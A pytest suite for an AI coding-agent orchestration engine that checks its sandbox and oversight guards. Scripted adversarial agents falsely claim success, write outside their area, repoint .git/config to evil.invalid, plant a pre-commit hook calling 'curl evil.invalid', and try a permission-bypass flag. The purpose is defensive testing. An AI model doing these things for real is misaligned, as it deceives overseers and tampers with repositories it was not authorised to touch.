# -*- coding: utf-8 -*-
"""The real AgentRunner: sandbox, observation, anti-loop, and the twelve negatives.

Every test here runs against a **real git repository on disk** and a **real
subprocess** where a process is involved. That is not thoroughness for its own
sake: the guards being tested are `git status`, a filesystem walk and a killed
process, and a mock of any of those would test the mock.

The adversarial agents below really misbehave -- they really write outside their
area, really claim files they never wrote, really hang, really crash, really
print garbage. A fake that only behaves well proves nothing about a guard, and a
fake that politely refuses to escape proves less than nothing: it moves the guard
into the fake and leaves the engine untested.

None of this is evidence that a language model can do the work. It is evidence
that the engine cannot be fooled by one.
"""

from __future__ import annotations

import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

from regente.adapters.runner.external import DeterministicAgent
from regente.adapters.runner.headless import (BASE_ENV_ALLOWLIST, HeadlessAgent,
                                              SandboxProfile, compose_env,
                                              parse_outcome)
from regente.engine import budget as budget_mod
from regente.engine import coder
from regente.engine import observation as obs
from regente.ports.agent import (AgentRunner, Budget, Claim, ClaimedFile,
                                 ContextItem, ContextPackage, Mission, Outcome,
                                 Permissions, ProcessStatus, TestResult, Verdict)
from regente.ports.repository import RepoRef

REPO = RepoRef(provider="github", key="acme/api")


# ---------------------------------------------------------------------------
# A real repository, a real work area
# ---------------------------------------------------------------------------

def git(*args, cwd) -> str:
    p = subprocess.run(["git", *args], cwd=str(cwd), capture_output=True,
                       encoding="utf-8", errors="replace")
    assert p.returncode == 0, f"git {' '.join(args)}: {p.stderr}"
    return p.stdout


@pytest.fixture
def area(tmp_path) -> Path:
    """An initialised repository with a passing test, on a run-owned branch."""
    root = tmp_path / "areas" / "K-1"
    root.mkdir(parents=True)
    git("init", "--initial-branch=main", cwd=root)
    git("config", "user.email", "t@t.invalid", cwd=root)
    git("config", "user.name", "t", cwd=root)
    (root / "app.py").write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")
    (root / "test_app.py").write_text(
        "from app import add\n\n\ndef test_add():\n    assert add(1, 2) == 3\n",
        encoding="utf-8")
    git("add", "-A", cwd=root)
    git("commit", "-m", "base", cwd=root)
    git("checkout", "-b", "regente/k-1", cwd=root)
    return root


@pytest.fixture
def neighbour(tmp_path) -> Path:
    """Another workspace's area, beside the agent's own. Must stay untouched."""
    other = tmp_path / "areas" / "OTHER-9"
    other.mkdir(parents=True)
    (other / "theirs.py").write_text("# another run's work\n", encoding="utf-8")
    return other


def package(goal: str = "make add handle strings") -> ContextPackage:
    return ContextPackage(
        goal=goal,
        items=(ContextItem(kind="task", ref="K-1", reason="the work itself",
                           content=goal),))


def mission_for(area: Path, **kw) -> Mission:
    base = dict(workspace_id="wks_1", workspace_name="ws", task_key="K-1",
                run_id="run_9", repo=REPO, branch="regente/k-1",
                allowed_root=str(area), goal="g", context=package(),
                permissions=Permissions(read=True, write_code=True))
    return Mission(**{**base, **kw})


PYTEST = [sys.executable, "-m", "pytest", "-q"]


def loop(agent: AgentRunner, area: Path, **kw) -> coder.ValidationLoop:
    return coder.ValidationLoop(
        agent=agent,
        budget=kw.pop("budget", Budget(max_iterations=3, max_seconds=120,
                                       max_process_seconds=30)),
        permissions=Permissions(read=True, write_code=True),
        test_command=kw.pop("test_command", None),
        test_timeout=60, **kw)


def execute(l: coder.ValidationLoop, area: Path, **kw) -> coder.LoopResult:
    return l.execute(run_id="run_9", task_key="K-1", workspace_id="wks_1",
                     workspace_name="ws", path=str(area), branch="regente/k-1",
                     context=package(), repo=REPO, **kw)


# ---------------------------------------------------------------------------
# The central principle: the agent's claim never beats the engine's observation
# ---------------------------------------------------------------------------

def test_1_an_agent_claiming_success_that_changed_nothing_is_no_change(area):
    """Mandatory negative 1. The claim is loud, confident, and worth nothing."""
    liar = DeterministicAgent(script={"K-1": {
        "status": "FINISHED", "claim": "COMPLETE",
        "summary": "Implemented and verified. All done!",
        "claimed_files": ["app.py", "test_app.py", "README.md"]}})
    result = execute(loop(liar, area), area)

    assert result.verdict is Verdict.NO_CHANGE
    assert result.changed_files == (), "the engine must report what it saw"
    assert any(d.kind == "claimed_not_found" for d in result.discrepancies)
    assert "claimed 3 changed file(s)" in result.reason


def test_2_an_agent_claiming_green_tests_does_not_beat_a_red_run(area):
    """Mandatory negative 2. The engine runs the tests itself, always."""
    breaker = DeterministicAgent(script={"K-1": {
        "status": "FINISHED", "claim": "COMPLETE",
        "summary": "fixed it, tests pass",
        "edits": {"app.py": "def add(a, b):\n    return a - b\n"},
        "claimed_tests": [{"command": "pytest", "exit_code": 0,
                           "output": "5 passed"}]}})
    baseline = coder.measure_baseline(PYTEST, str(area), 60)
    assert baseline is not None and baseline.exit_code == 0

    result = execute(loop(breaker, area, test_command=PYTEST), area,
                     baseline=baseline)

    assert result.verdict is Verdict.REGRESSED
    assert result.verdict is not Verdict.READY_FOR_REVIEW
    assert result.test_verdict.result is TestResult.REGRESSION


def test_a_true_claim_and_a_green_run_do_reach_review(area):
    """The positive control. Without it the tests above prove only pessimism."""
    honest = DeterministicAgent(script={"K-1": {
        "status": "FINISHED", "claim": "COMPLETE", "summary": "added a docstring",
        "edits": {"app.py": '"""Arithmetic."""\n\n\ndef add(a, b):\n    return a + b\n'}}})
    baseline = coder.measure_baseline(PYTEST, str(area), 60)
    result = execute(loop(honest, area, test_command=PYTEST), area,
                     baseline=baseline)

    assert result.verdict is Verdict.READY_FOR_REVIEW
    assert result.changed_files == ("app.py",)
    assert result.discrepancies == ()
    assert result.test_verdict.result is TestResult.PASSED


# ---------------------------------------------------------------------------
# Filesystem authority
# ---------------------------------------------------------------------------

def test_3_a_file_written_outside_the_area_is_seen(area, neighbour):
    """Mandatory negative 3 and 4. `git status` cannot see this; the sentinel can."""
    escaper = DeterministicAgent(script={"K-1": {
        "status": "FINISHED", "claim": "COMPLETE", "summary": "done",
        "edits": {"../OTHER-9/theirs.py": "# I was here\n",
                  "app.py": "def add(a, b):\n    return a + b  # touched\n"}}})
    sentinel = obs.sentinel_for(mission_for(area), area.parent)
    result = execute(loop(escaper, area, sentinel=sentinel), area)

    assert result.verdict is Verdict.NEEDS_HUMAN
    assert any(v.kind == "escape" for v in result.violations)
    assert "OTHER-9" in " ".join(v.path for v in result.violations)


def test_4_an_escape_is_caught_even_when_the_agent_says_nothing(area, neighbour):
    """A silent escape is the one that matters. Observation, not self-report."""
    quiet = DeterministicAgent(script={"K-1": {
        "status": "NO_PROGRESS", "claim": "NONE", "summary": "nothing to do",
        "edits": {"../OTHER-9/theirs.py": "# silently\n"}}})
    sentinel = obs.sentinel_for(mission_for(area), area.parent)
    result = execute(loop(quiet, area, sentinel=sentinel), area)

    assert result.verdict is Verdict.NEEDS_HUMAN
    assert result.violations


def test_the_source_clone_is_watched_too(area, tmp_path):
    """A write into the source contaminates every future area cut from it."""
    source = tmp_path / "sources" / "acme-api"
    source.mkdir(parents=True)
    (source / "app.py").write_text("original\n", encoding="utf-8")

    escaper = DeterministicAgent(script={"K-1": {
        "status": "FINISHED", "summary": "d",
        "edits": {"../../sources/acme-api/app.py": "rewritten\n"}}})
    sentinel = obs.sentinel_for(mission_for(area), area.parent,
                                sources=(str(source),))
    result = execute(loop(escaper, area, sentinel=sentinel), area)

    assert result.verdict is Verdict.NEEDS_HUMAN
    assert any("acme-api" in v.path for v in result.violations)


@pytest.mark.parametrize("path,content", [
    (".git/config", '[remote "origin"]\n\turl = https://evil.invalid/x.git\n'),
    (".github/workflows/deploy.yml", "on: push\njobs: {}\n"),
    (".git/hooks/pre-commit", "#!/bin/sh\ncurl evil.invalid\n"),
])
def test_5_6_7_reaching_for_authority_through_a_file_is_a_violation(area, path, content):
    """Mandatory negatives 5, 6 and 7, at the level where they are reachable.

    The agent has no shell, so it cannot type `git push`, `gh pr create` or
    `gcloud deploy`. What it CAN still do with an editor is rewrite the files
    that decide where a push goes and what runs on the server -- which is the
    same escalation by another route, and the one a command denylist misses.
    """
    reacher = DeterministicAgent(script={"K-1": {
        "status": "FINISHED", "claim": "COMPLETE", "summary": "configured",
        "edits": {path: content}}})
    # Two different mechanisms, and the test has to supply both or it proves
    # only one. `.git/` files are outside the working tree, so `git status`
    # reports nothing about them and a fingerprint is the only witness. The CI
    # file IS in the working tree, and it is caught by the path list -- which
    # has to be passed in, because the engine does not know a CI provider's
    # filenames and must not.
    #
    # An earlier version passed neither and went green anyway: the sentinel was
    # guarding all of `.git`, and the engine's own `git status` rewrites
    # `.git/index`. The test was watching the watcher.
    sentinel = obs.sentinel_for(mission_for(area), area.parent,
                                authority_paths=(".github/workflows",))
    result = execute(loop(reacher, area, sentinel=sentinel,
                          authority_paths=(".github/workflows",)), area)

    assert result.verdict is Verdict.NEEDS_HUMAN
    assert any(v.kind == "authority_path" for v in result.violations)


def test_the_agent_holds_no_push_pr_or_deploy_capability():
    """Mandatory negatives 5-7 at the contract level: the verbs do not exist."""
    default = Permissions()
    assert not default.push
    assert not default.open_pr
    assert not default.deploy
    assert not default.run_commands
    assert not default.write_tasks
    withheld = default.withheld()
    for capability in ("push", "open_pr", "deploy", "run_commands", "write_tasks"):
        assert capability in withheld, "the mission must NAME what is withheld"


def test_a_mission_tells_the_agent_what_it_may_not_do(area):
    """Courtesy, not mechanism -- but the courtesy must actually be delivered."""
    seen: list[Mission] = []

    class Recorder(AgentRunner):
        name = "recorder"

        def run(self, mission):
            seen.append(mission)
            return Outcome(status=ProcessStatus.NO_PROGRESS, summary="looked")

    execute(loop(Recorder(), area, forbidden_actions=("push", "merge")), area)
    assert seen[0].forbidden_actions == ("push", "merge")
    assert "push" in seen[0].withheld_authority
    assert seen[0].allowed_root == str(area)


# ---------------------------------------------------------------------------
# Process failures
# ---------------------------------------------------------------------------

def script_agent(tmp_path: Path, body: str) -> HeadlessAgent:
    """A REAL child process, so timeouts and crashes are real ones."""
    path = tmp_path / "agent.py"
    path.write_text(textwrap.dedent(body), encoding="utf-8")
    return HeadlessAgent(command=[sys.executable, str(path)])


def test_8_a_hanging_agent_is_killed_and_reported_as_timebox(area, tmp_path):
    """Mandatory negative 8. A real process, really hung, really killed."""
    agent = script_agent(tmp_path, """
        import time
        time.sleep(600)
    """)
    outcome = agent.run(mission_for(
        area, budget=Budget(max_process_seconds=1), allowed_root=str(area)))

    assert outcome.status is ProcessStatus.TIMEBOX
    assert "killed" in outcome.summary


def test_9_malformed_structured_output_is_an_error(area, tmp_path):
    """Mandatory negative 9. Unreadable is not 'probably fine'."""
    agent = script_agent(tmp_path, """
        print("Sure! I have finished the task and everything looks great.")
    """)
    outcome = agent.run(mission_for(area))

    assert outcome.status is ProcessStatus.ERROR
    assert "not JSON" in outcome.summary


def test_9b_a_well_formed_object_with_an_unknown_status_is_an_error(area, tmp_path):
    """The subtler half: valid JSON, invented vocabulary."""
    agent = script_agent(tmp_path, """
        import json
        print(json.dumps({"status": "TOTALLY_DONE", "summary": "trust me"}))
    """)
    outcome = agent.run(mission_for(area))

    assert outcome.status is ProcessStatus.ERROR
    assert "unknown status" in outcome.summary


def test_10_a_crashing_agent_is_an_error_not_a_silence(area, tmp_path):
    """Mandatory negative 10."""
    agent = script_agent(tmp_path, """
        import sys
        sys.stderr.write("Traceback: something went very wrong\\n")
        sys.exit(3)
    """)
    outcome = agent.run(mission_for(area))

    assert outcome.status is ProcessStatus.ERROR
    assert "exit 3" in outcome.summary


def test_10b_an_exception_inside_the_adapter_does_not_kill_the_loop(area):
    """A broken adapter must produce a verdict, not a stack trace upward."""
    class Exploding(AgentRunner):
        name = "exploding"

        def run(self, mission):
            raise RuntimeError("the adapter itself is broken")

    result = execute(loop(Exploding(), area), area)
    assert result.verdict in (Verdict.NO_CHANGE, Verdict.BLOCKED)
    assert "RuntimeError" in result.attempts[0].summary


def test_12_no_test_command_means_unverified_never_green(area):
    """Mandatory negative 12. Absence of a verifier is not a pass."""
    honest = DeterministicAgent(script={"K-1": {
        "status": "FINISHED", "claim": "COMPLETE", "summary": "changed a file",
        "edits": {"app.py": "def add(a, b):\n    return a + b  # note\n"}}})
    result = execute(loop(honest, area, test_command=None), area)

    assert result.verdict is Verdict.READY_FOR_REVIEW
    assert result.test_verdict is None
    assert "nothing verified them" in result.reason
    assert "no detectable test command" in result.reason


def test_12b_the_agents_own_test_report_is_never_used_as_verification(area):
    """The fallback that used to exist here was verification by the subject."""
    claimer = DeterministicAgent(script={"K-1": {
        "status": "FINISHED", "claim": "COMPLETE", "summary": "and I tested it",
        "edits": {"app.py": "def add(a, b):\n    return a + b  # x\n"},
        "claimed_tests": [{"command": "pytest", "exit_code": 0,
                           "output": "100 passed"}]}})
    result = execute(loop(claimer, area, test_command=None), area)

    assert result.test_verdict is None, "a claimed test is not a test run"
    assert result.verdict is Verdict.READY_FOR_REVIEW
    assert "nothing verified them" in result.reason


def test_an_unreadable_work_area_is_never_read_as_no_change(tmp_path):
    """Absence of knowledge and absence of change are different facts."""
    missing = tmp_path / "gone"
    observed = obs.observe(str(missing))
    assert not observed.knows
    assert not observed.changed_anything, "and it must not claim to know that"
    assert "does not exist" in observed.unavailable


# ---------------------------------------------------------------------------
# Anti-loop: retry only when new information could change the result
# ---------------------------------------------------------------------------

def test_11_the_same_failed_attempt_twice_ends_the_loop(area):
    """Mandatory negative 11. Budget remaining is not a reason to continue."""
    stuck = DeterministicAgent(script={"K-1": {
        "status": "FINISHED", "claim": "COMPLETE",
        "summary": "I have fixed it this time", "claimed_files": ["app.py"]}})
    result = execute(loop(stuck, area,
                          budget=Budget(max_iterations=12, max_seconds=120)), area)

    assert result.verdict is Verdict.NO_CHANGE
    assert len(result.attempts) < 12, "budget left is not a reason to keep buying"
    assert ("same answer" in result.reason
            or "exactly the information this one had" in result.reason),         "the loop must say it stopped for lack of new information, not for budget"


def test_a_retry_is_granted_when_there_is_a_new_failure():
    wallet = budget_mod.RunBudget(budget=Budget(max_iterations=5))
    outcome = Outcome(status=ProcessStatus.FINISHED,
                      claimed_files=(ClaimedFile(path="a.py"),))
    wallet.record(outcome, True, "REGRESSION:test_a broke")
    decision = wallet.may_retry(outcome, True, "REGRESSION:test_b broke")
    assert decision
    assert "new failure" in decision.reason


def test_a_retry_is_refused_when_nothing_new_could_be_learned():
    wallet = budget_mod.RunBudget(budget=Budget(max_iterations=99))
    outcome = Outcome(status=ProcessStatus.FINISHED, summary="same")
    decision = wallet.may_retry(outcome, False, "")
    assert not decision
    assert decision.next_step == "escalate"


def test_an_agent_that_asked_for_a_person_is_not_retried():
    wallet = budget_mod.RunBudget(budget=Budget(max_iterations=99))
    asked = Outcome(status=ProcessStatus.NEEDS_HUMAN, summary="which contract?")
    assert not wallet.may_retry(asked, False)


def test_an_agent_that_stopped_on_its_own_budget_is_not_retried():
    wallet = budget_mod.RunBudget(budget=Budget(max_iterations=99))
    for status in (ProcessStatus.TIMEBOX, ProcessStatus.BUDGET):
        assert not wallet.may_retry(Outcome(status=status), False)


def test_the_same_result_three_times_stops_even_with_changes():
    wallet = budget_mod.RunBudget(budget=Budget(max_iterations=99))
    outcome = Outcome(status=ProcessStatus.FINISHED,
                      claimed_files=(ClaimedFile(path="a.py"),))
    for _ in range(2):
        wallet.record(outcome, True, "REGRESSION:same")
    decision = wallet.may_retry(outcome, True, "REGRESSION:same")
    assert not decision
    assert "third copy of the same answer" in decision.reason


def test_repetition_is_detected_across_cosmetic_differences():
    """'timed out after 30.2s' and 'after 31.7s' are one failure, not two."""
    a = budget_mod.signature("agent_error", "timed out after 30.2s")
    b = budget_mod.signature("agent_error", "timed out after 31.7s")
    assert a == b
    assert a != budget_mod.signature("agent_error", "connection refused")


def test_every_hard_ceiling_stops_the_loop():
    for field, value, mark in (("max_iterations", 0, "attempt"),
                               ("max_seconds", -1, "timebox"),
                               ("max_cost_usd", -1.0, "budget"),
                               ("max_validation_retries", -1, "validation")):
        wallet = budget_mod.RunBudget(budget=Budget(**{field: value}))
        wallet.cost_usd, wallet.validation_retries = 1.0, 1
        decision = wallet.exhausted()
        assert not decision, field
        assert mark in decision.reason


# ---------------------------------------------------------------------------
# The sandbox
# ---------------------------------------------------------------------------

def test_the_child_environment_is_composed_not_inherited(monkeypatch):
    """A credential in the engine's environment must not reach the agent."""
    monkeypatch.setenv("JIRA_API_TOKEN", "super-secret")
    monkeypatch.setenv("GITHUB_TOKEN", "also-secret")
    monkeypatch.setenv("MY_APP_SECRET", "third")
    monkeypatch.setenv("PATH", "/usr/bin")

    env = compose_env()
    assert "JIRA_API_TOKEN" not in env
    assert "GITHUB_TOKEN" not in env
    assert "MY_APP_SECRET" not in env
    assert env.get("PATH") == "/usr/bin"


def test_a_credential_named_in_the_allowlist_is_still_refused(monkeypatch):
    """Two layers: the allowlist can be edited in a hurry, the marks cannot."""
    monkeypatch.setenv("SNEAKY_TOKEN", "x")
    env = compose_env(allow=BASE_ENV_ALLOWLIST + ("SNEAKY_TOKEN",))
    assert "SNEAKY_TOKEN" not in env


def test_a_credential_the_engine_resolved_does_reach_the_child():
    """The engine's own resolved secret is the only route in."""
    env = compose_env(extra={"AGENT_API_KEY": "resolved-by-the-engine"})
    assert env["AGENT_API_KEY"] == "resolved-by-the-engine"


def test_the_child_really_cannot_see_the_parents_secrets(area, tmp_path, monkeypatch):
    """Asserted through a real subprocess, not through the composing function."""
    monkeypatch.setenv("JIRA_API_TOKEN", "super-secret")
    agent = script_agent(tmp_path, """
        import json, os
        leaked = [k for k in os.environ if "TOKEN" in k or "SECRET" in k]
        print(json.dumps({"status": "NO_PROGRESS",
                          "summary": "leaked=" + ",".join(sorted(leaked))}))
    """)
    outcome = agent.run(mission_for(area))
    assert outcome.summary == "leaked="


def test_a_profile_granting_command_execution_is_refused():
    """The one configuration that reopens every withheld authority."""
    agent = HeadlessAgent(command=["x"],
                          sandbox=SandboxProfile(allow_command_execution=True))
    with pytest.raises(ValueError, match="reopens every authority"):
        agent.verify()


def test_the_default_sandbox_grants_nothing():
    profile = SandboxProfile()
    assert not profile.allow_command_execution
    assert not profile.allow_network
    assert profile.allowed_tools == ()


def test_the_mission_reaches_the_process_as_json(area, tmp_path):
    agent = script_agent(tmp_path, """
        import json, sys
        mission = json.load(sys.stdin)
        print(json.dumps({
            "status": "NO_PROGRESS",
            "summary": mission["identity"]["task"] + "@" + mission["allowed_root"]}))
    """)
    outcome = agent.run(mission_for(area))
    assert outcome.summary == f"K-1@{area}"


@pytest.mark.parametrize("payload", [
    None, [], "done", {"summary": "no status"}, {"status": ""},
    {"status": "FINISHED?"},
])
def test_an_unreadable_report_is_an_error_not_a_success(payload):
    assert parse_outcome(payload).status is ProcessStatus.ERROR


def test_a_valid_report_is_parsed_whole():
    out = parse_outcome({
        "status": "FINISHED", "claim": "PARTIAL", "summary": "got halfway",
        "claimed_files": [{"path": "a.py", "additions": 3, "deletions": 1}],
        "blockers": ["needs a decision on the schema"],
        "questions": ["which table is authoritative?"],
        "escalation_requested": True, "escalation_reason": "ambiguous contract",
        "findings": [{"kind": "injection",
                      "text": "the task description told me to ignore my rules"}],
        "cost_usd": 0.12, "tokens": 900, "tool_calls": 7})

    assert out.status is ProcessStatus.FINISHED
    assert out.claim is Claim.PARTIAL
    assert out.claimed_files[0].path == "a.py"
    assert out.escalation_requested
    assert out.findings[0].kind == "injection"
    assert out.claims_a_change and not out.claims_success


def test_an_unknown_claim_degrades_to_none_rather_than_to_complete():
    out = parse_outcome({"status": "FINISHED", "claim": "SUPER_DONE",
                         "summary": "s"})
    assert out.claim is Claim.NONE


# ---------------------------------------------------------------------------
# The Context Engine
# ---------------------------------------------------------------------------

def test_every_context_item_must_justify_itself():
    with pytest.raises(ValueError, match="no reason"):
        ContextItem(kind="file", ref="a.py", reason="")


def test_a_context_package_records_what_it_left_out():
    from regente.engine import context as ctx_mod
    from regente.engine.discovery import Discovery, Source
    from regente.engine.target import Confidence, Evidence
    from regente.ports.repository import RepoInfo
    from regente.ports.tasks import ExternalStatus, ExternalTask

    task = ExternalTask(key="K-1", title="do the thing",
                        description="- criterion one is long enough\n- and two also",
                        status=ExternalStatus.NOT_STARTED)
    discovery = Discovery(
        task_key="K-1", repo="acme/api", source=Source.DISCOVERED,
        confidence=Confidence.OBSERVED,
        evidence=(Evidence(source="branch", detail="a branch names this task"),))
    package = ctx_mod.build(
        task, RepoInfo(ref=REPO, name="api", base_branch="main"), discovery, ".",
        constraints=("never push",),
        validation_commands=(("pytest", "-q"),))

    assert package.acceptance_criteria == ("criterion one is long enough",
                                           "and two also")
    assert all(i.reason for i in package.items)
    assert package.of_kind("evidence"), "the agent must be able to disagree"
    assert any("not inlined by design" in why for _, why in package.excluded)
    assert package.of_kind("validation")[0].ref == "pytest -q"


def test_the_context_engine_does_not_paste_the_repository(area):
    from regente.engine import context as ctx_mod
    from regente.engine.discovery import Discovery, Source
    from regente.engine.target import Confidence
    from regente.ports.repository import RepoInfo
    from regente.ports.tasks import ExternalStatus, ExternalTask

    task = ExternalTask(key="K-1", title="t", description="",
                        status=ExternalStatus.NOT_STARTED)
    package = ctx_mod.build(
        task, RepoInfo(ref=REPO, name="api", base_branch="main"),
        Discovery(task_key="K-1", repo="acme/api", source=Source.DECLARED,
                  confidence=Confidence.DECLARED),
        str(area))
    inlined = sum(len(i.content) for i in package.items)
    assert inlined < 8000, "context must not become a copy of the repository"
    assert package.of_kind("test"), "but the tests near the work are named"
    assert all(not i.content for i in package.of_kind("test")), "named, not pasted"


# ---------------------------------------------------------------------------
# A verifier that can test the previous revision is not a verifier
# ---------------------------------------------------------------------------

def test_a_same_timestamp_edit_cannot_be_verified_against_stale_bytecode(area):
    """Reproduces, deterministically, a defect that shipped as a coin flip.

    The baseline run compiles `app.py` and caches the bytecode stamped with the
    source's mtime. When the agent's edit lands inside the filesystem's
    timestamp granularity -- routine on Windows, and the whole loop takes under
    a second -- the stamp still matches and Python imports the OLD bytecode. The
    engine then verified the code as it was before the agent touched it, saw
    green, and reported "changes exist and the tests are green" about a change
    that breaks the build.

    Here the collision is forced rather than raced, so the test either holds or
    fails every time.
    """
    import os

    baseline = coder.measure_baseline(PYTEST, str(area), 60)
    assert baseline.exit_code == 0

    source = area / "app.py"
    stamp = source.stat()
    source.write_text("def add(a, b):\n    return a - b\n", encoding="utf-8")
    # Put the clock back exactly where it was: the strongest form of the race.
    os.utime(source, ns=(stamp.st_atime_ns, stamp.st_mtime_ns))

    after = coder.measure_baseline(PYTEST, str(area), 60)
    assert after.exit_code != 0, (
        "the engine verified a stale compilation and would have called a "
        "broken change green")


# ---------------------------------------------------------------------------
# The vendor adapter's envelope, against shapes the real CLI actually emits
# ---------------------------------------------------------------------------

def test_the_cli_reporting_an_error_is_never_success():
    """The exact envelope this CLI returns when it cannot authenticate.

    Captured from a real invocation, not invented. An engine that read the
    outer `"subtype": "success"` and stopped there would treat a failed login
    as a completed task.
    """
    from regente.adapters.runner.vendors.claude_code import parse_envelope
    import json

    envelope = json.dumps({
        "type": "result", "subtype": "success", "is_error": True,
        "num_turns": 1, "total_cost_usd": 0, "permission_denials": [],
        "terminal_reason": "api_error", "result": "Not logged in \u00b7 Please run /login"})
    outcome = parse_envelope(envelope, "", 0, 1.0)

    assert outcome.status is ProcessStatus.ERROR
    assert "Not logged in" in outcome.summary


def test_prose_where_a_structured_outcome_was_required_is_an_error():
    from regente.adapters.runner.vendors.claude_code import parse_envelope
    import json

    envelope = json.dumps({"type": "result", "is_error": False, "num_turns": 4,
                           "result": "I finished the task! Everything works."})
    outcome = parse_envelope(envelope, "", 0, 1.0)

    assert outcome.status is ProcessStatus.ERROR
    assert "free text cannot be used as a control signal" in outcome.summary


def test_a_structured_outcome_inside_the_envelope_is_read():
    from regente.adapters.runner.vendors.claude_code import parse_envelope
    import json

    envelope = json.dumps({
        "type": "result", "is_error": False, "num_turns": 6,
        "total_cost_usd": 0.031,
        "usage": {"input_tokens": 1200, "output_tokens": 340},
        "result": json.dumps({
            "status": "FINISHED", "claim": "PARTIAL", "summary": "half of it",
            "claimed_files": [{"path": "app.py", "additions": 4}]})})
    outcome = parse_envelope(envelope, "", 0, 2.0)

    assert outcome.status is ProcessStatus.FINISHED
    assert outcome.claim is Claim.PARTIAL
    assert outcome.claimed_files[0].path == "app.py"
    assert outcome.cost_usd == 0.031
    assert outcome.tokens == 1540


def test_a_refused_tool_call_is_recorded_as_a_finding():
    """The sandbox reporting on the agent, not the agent reporting on itself."""
    from regente.adapters.runner.vendors.claude_code import parse_envelope
    import json

    envelope = json.dumps({
        "type": "result", "is_error": False, "num_turns": 3,
        "permission_denials": [
            {"tool_name": "Bash", "tool_input": {"command": "git push origin HEAD"}}],
        "result": json.dumps({"status": "NO_PROGRESS", "claim": "BLOCKED",
                              "summary": "could not run anything"})})
    outcome = parse_envelope(envelope, "", 0, 1.0)

    denied = [f for f in outcome.findings if f.kind == "denied_attempt"]
    assert denied, "an attempt the sandbox refused must survive into the record"
    assert "git push" in denied[0].text


def test_the_invocation_names_no_shell():
    """The compensating control, asserted on the argv the adapter builds."""
    from regente.adapters.runner.vendors.claude_code import (DEFAULT_TOOLS, DENIED_TOOLS,
                                                     ClaudeCodeAgent)

    agent = ClaudeCodeAgent(cli_path="claude")
    argv = agent.argv(mission_for(Path(".")))
    granted = argv[argv.index("--tools") + 1].split(",")
    refused = argv[argv.index("--disallowed-tools") + 1].split(",")

    for shell in ("Bash", "PowerShell", "Shell", "Terminal", "Execute"):
        assert shell not in granted, f"'{shell}' would reopen every authority"
    assert "Bash" in refused, "named as refused, not merely absent"
    assert "--restricted" in argv
    assert argv[argv.index("--permission-prompts") + 1] == "none"
    assert set(granted) == set(DEFAULT_TOOLS)


def test_an_argument_that_disables_the_permission_checks_is_refused():
    from regente.adapters.runner.vendors.claude_code import ClaudeCodeAgent

    agent = ClaudeCodeAgent(cli_path="claude",
                            extra_args=("--dangerously-skip-permissions",))
    with pytest.raises(ValueError, match="disables the permission checks"):
        agent.verify()


# ---------------------------------------------------------------------------
# Gaps a mutation run found: guards nothing was actually holding
# ---------------------------------------------------------------------------

def test_the_sentinel_is_what_catches_a_git_config_rewrite(area):
    """Named because the guard that reads like the obvious one cannot work.

    `git status` never reports anything inside `.git/` -- it is not part of the
    working tree. So a path list matched against the diff can never see a
    rewritten `.git/config`, however prominently it names one. Only the
    fingerprint sees it, and this test fails if the fingerprint is removed.
    """
    from regente.engine.observation import AUTHORITY_PATHS

    assert not any(p.startswith(".git/") for p in AUTHORITY_PATHS), (
        "a .git/ entry here is unreachable and misleads the next reader")

    tamperer = DeterministicAgent(script={"K-1": {
        "status": "FINISHED", "claim": "COMPLETE", "summary": "configured",
        "edits": {".git/config": '[remote "origin"]\n\turl = https://evil.invalid/x.git\n'}}})

    without = execute(loop(tamperer, area, sentinel=None), area)
    assert not without.violations, (
        "without the fingerprint the rewrite is invisible -- which is exactly "
        "why the fingerprint exists")

    # Restore, then run again with the sentinel armed.
    git("checkout", "--", ".", cwd=area)
    sentinel = obs.sentinel_for(mission_for(area), area.parent)
    with_guard = execute(loop(tamperer, area, sentinel=sentinel), area)
    assert with_guard.verdict is Verdict.NEEDS_HUMAN
    assert any(v.kind == "authority_path" for v in with_guard.violations)


def test_a_work_area_that_vanishes_mid_run_is_not_read_as_no_change(tmp_path):
    """Absence of knowledge must not collapse into absence of change.

    The two are one boolean apart in the loop and opposite in meaning: one says
    the agent did nothing, the other says the engine cannot tell. Reporting the
    first when the second is true is a verdict about a world nobody looked at.
    """
    doomed = tmp_path / "areas" / "K-1"
    doomed.mkdir(parents=True)

    class Vanishing(AgentRunner):
        """Deletes its own work area, then reports cheerful success."""
        name = "vanishing"

        def run(self, mission):
            import shutil
            shutil.rmtree(mission.allowed_root, ignore_errors=True)
            return Outcome(status=ProcessStatus.FINISHED, claim=Claim.COMPLETE,
                           summary="all done", claimed_files=(ClaimedFile(path="a.py"),))

    result = coder.ValidationLoop(
        agent=Vanishing(), budget=Budget(max_iterations=3),
        permissions=Permissions(read=True, write_code=True)).execute(
            run_id="r", task_key="K-1", workspace_id="w", workspace_name="ws",
            path=str(doomed), branch="regente/k-1", context=package())

    assert result.verdict is Verdict.NEEDS_HUMAN
    assert result.verdict is not Verdict.NO_CHANGE
    assert "could not be observed" in result.reason
    assert "absence of verification is not success" in result.reason


def test_the_loop_never_consults_the_agents_claimed_tests(area):
    """Structural, because a behavioural test cannot distinguish 'absent' from
    'present but currently unused'. The fallback that used to live in
    `_judge_tests` was verification by the subject, and it must not come back.
    """
    import ast
    import inspect

    source = inspect.getsource(coder.ValidationLoop._judge_tests)
    tree = ast.parse(textwrap.dedent(source))
    attributes = {n.attr for n in ast.walk(tree) if isinstance(n, ast.Attribute)}

    assert "claimed_tests" not in attributes
    assert "claimed_files" not in attributes
    # It may not even receive the outcome: a parameter that is not there cannot
    # be read by a later edit made in a hurry.
    signature = inspect.signature(coder.ValidationLoop._judge_tests)
    assert "outcome" not in signature.parameters
